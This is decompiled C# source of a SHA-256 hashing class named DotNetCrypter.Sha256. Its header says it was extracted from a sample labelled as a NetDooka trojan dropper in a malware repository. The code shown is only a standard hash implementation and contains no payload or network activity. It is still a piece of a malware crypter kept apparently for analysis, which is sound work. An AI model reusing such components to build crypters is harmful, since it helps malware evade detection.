// Decompiled with JetBrains decompiler
// Type: DotNetCrypter.Sha256
// Assembly: DotNetCrypter, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C758D580-6E9B-4B74-83EC-5C931860F746
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Dropper.MSIL.NetDooka.gen-43dcf8eea02b7286ba481ca84ec1b4d9299ba5db293177ff0a28231b36600a22.exe

using System;
using System.Collections.Generic;
using System.Linq;

namespace DotNetCrypter
{
  internal class Sha256
  {
    private static uint[] K = new uint[64]
    {
      1116352408U,
      1899447441U,
      3049323471U,
      3921009573U,
      961987163U,
      1508970993U,
      2453635748U,
      2870763221U,
      3624381080U,
      310598401U,
      607225278U,
      1426881987U,
      1925078388U,
      2162078206U,
      2614888103U,
      3248222580U,
      3835390401U,
      4022224774U,
      264347078U,
      604807628U,
      770255983U,
      1249150122U,
      1555081692U,
      1996064986U,
      2554220882U,
      2821834349U,
      2952996808U,
      3210313671U,
      3336571891U,
      3584528711U,
      113926993U,
      338241895U,
      666307205U,
      773529912U,
      1294757372U,
      1396182291U,
      1695183700U,
      1986661051U,
      2177026350U,
      2456956037U,
      2730485921U,
      2820302411U,
      3259730800U,
      3345764771U,
      3516065817U,
      3600352804U,
      4094571909U,
      275423344U,
      430227734U,
      506948616U,
      659060556U,
      883997877U,
      958139571U,
      1322822218U,
      1537002063U,
      1747873779U,
      1955562222U,
      2024104815U,
      2227730452U,
      2361852424U,
      2428436474U,
      2756734187U,
      3204031479U,
      3329325298U
    };

    public Sha256() => this.HashComputation(new byte[3]
    {
      (byte) 1,
      (byte) 2,
      (byte) 3
    });

    public byte[] HashComputation(byte[] message)
    {
      byte[] array = ((IEnumerable<byte>) BitConverter.GetBytes(Convert.ToUInt64(message.Length * 8))).Reverse<byte>().ToArray<byte>();
      int num1 = 0;
      while ((message.Length * 8 + 8 + num1 + 64) % 512 != 0)
        num1 += 8;
      byte[] numArray1 = new byte[(message.Length * 8 + 8 + num1 + 64) / 8];
      message.CopyTo((Array) numArray1, 0);
      numArray1[message.Length] = (byte) 128;
      for (int index = 1; index < 1 + num1 / 8; ++index)
        numArray1[message.Length + index] = (byte) 0;
      array.CopyTo((Array) numArray1, message.Length + 1 + num1 / 8);
      int length = numArray1.Length / 64;
      byte[][] numArray2 = new byte[length][];
      for (int index1 = 0; index1 < length; ++index1)
      {
        byte[] numArray3 = new byte[64];
        for (int index2 = 0; index2 < 64; ++index2)
          numArray3[index2] = numArray1[index1 * 64 + index2];
        numArray2[index1] = numArray3;
      }
      uint[] numArray4 = new uint[8]
      {
        1779033703U,
        3144134277U,
        1013904242U,
        2773480762U,
        1359893119U,
        2600822924U,
        528734635U,
        1541459225U
      };
      for (int index3 = 0; index3 < length; ++index3)
      {
        uint[] numArray5 = new uint[64];
        int index4 = 0;
        int index5 = 0;
        while (index4 < 16)
        {
          numArray5[index4] = (uint) ((int) numArray2[index3][index5] << 24 | (int) numArray2[index3][index5 + 1] << 16 | (int) numArray2[index3][index5 + 2] << 8) | (uint) numArray2[index3][index5 + 3];
          ++index4;
          index5 += 4;
        }
        for (uint index6 = 16; index6 < 64U; ++index6)
          numArray5[(int) index6] = Sha256.S1(numArray5[(int) index6 - 2]) + numArray5[(int) index6 - 7] + Sha256.S0(numArray5[(int) index6 - 15]) + numArray5[(int) index6 - 16];
        uint x1 = numArray4[0];
        uint y1 = numArray4[1];
        uint z1 = numArray4[2];
        uint num2 = numArray4[3];
        uint x2 = numArray4[4];
        uint y2 = numArray4[5];
        uint z2 = numArray4[6];
        uint num3 = numArray4[7];
        for (int index7 = 0; index7 < 64; ++index7)
        {
          uint num4 = num3 + Sha256.Z1(x2) + Sha256.Ch(x2, y2, z2) + Sha256.K[index7] + numArray5[index7];
          uint num5 = Sha256.Z0(x1) + Sha256.Maj(x1, y1, z1);
          num3 = z2;
          z2 = y2;
          y2 = x2;
          x2 = num2 + num4;
          num2 = z1;
          z1 = y1;
          y1 = x1;
          x1 = num4 + num5;
        }
        numArray4[0] = numArray4[0] + x1;
        numArray4[1] = numArray4[1] + y1;
        numArray4[2] = numArray4[2] + z1;
        numArray4[3] = numArray4[3] + num2;
        numArray4[4] = numArray4[4] + x2;
        numArray4[5] = numArray4[5] + y2;
        numArray4[6] = numArray4[6] + z2;
        numArray4[7] = numArray4[7] + num3;
      }
      byte[] numArray6 = new byte[32];
      for (int index = 0; index < 8; ++index)
        ((IEnumerable<byte>) BitConverter.GetBytes(numArray4[index])).Reverse<byte>().ToArray<byte>().CopyTo((Array) numArray6, index * 4);
      return numArray6;
    }

    private static uint RotR(uint a, byte n) => a >> (int) n | a << 32 - (int) n;

    private static uint ShR(uint a, byte n) => a >> (int) n;

    private static uint Ch(uint x, uint y, uint z) => (uint) ((int) x & (int) y ^ ~(int) x & (int) z);

    private static uint Maj(uint x, uint y, uint z) => (uint) ((int) x & (int) y ^ (int) x & (int) z ^ (int) y & (int) z);

    private static uint Z0(uint x) => Sha256.RotR(x, (byte) 2) ^ Sha256.RotR(x, (byte) 13) ^ Sha256.RotR(x, (byte) 22);

    private static uint Z1(uint x) => Sha256.RotR(x, (byte) 6) ^ Sha256.RotR(x, (byte) 11) ^ Sha256.RotR(x, (byte) 25);

    private static uint S0(uint x) => Sha256.RotR(x, (byte) 7) ^ Sha256.RotR(x, (byte) 18) ^ Sha256.ShR(x, (byte) 3);

    private static uint S1(uint x) => Sha256.RotR(x, (byte) 17) ^ Sha256.RotR(x, (byte) 19) ^ Sha256.ShR(x, (byte) 10);

    private uint SomeFunc(uint a) => 0;
  }
}
